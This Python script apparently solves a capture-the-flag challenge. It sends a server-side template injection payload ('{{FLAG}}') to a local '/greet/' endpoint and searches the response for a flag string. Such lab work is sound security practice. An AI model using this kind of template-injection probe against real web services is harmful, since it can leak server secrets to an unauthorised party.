#!/usr/bin/env python3

def main():
    print("Starting SSTI flag validation test")
    
    try:
        import requests
        print("[+] requests imported successfully")
        
        url = "http://localhost:32786/greet/"
        payload = {"name": "{{FLAG}}"}
        
        print(f"[+] Target URL: {url}")
        print(f"[+] Payload: {payload}")
        print("[+] Sending request...")
        
        response = requests.get(url, params=payload, timeout=30)
        
        print(f"[+] Response received!")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Content Length: {len(response.text)}")
        print(f"\n[+] Full Response:")
        print(response.text)
        
        import re
        flags = re.findall(r'FLAG\{[a-fA-F0-9]+\}', response.text)
        
        if flags:
            print(f"\n[SUCCESS] FLAG FOUND:")
            for flag in flags:
                print(flag)
        else:
            print("\n[INFO] No FLAG{} pattern found in response")
            
    except Exception as e:
        import traceback
        print(f"\n[ERROR] Exception occurred:")
        print(f"Type: {type(e).__name__}")
        print(f"Message: {str(e)}")
        print(f"\nTraceback:")
        traceback.print_exc()

if __name__ == "__main__":
    main()

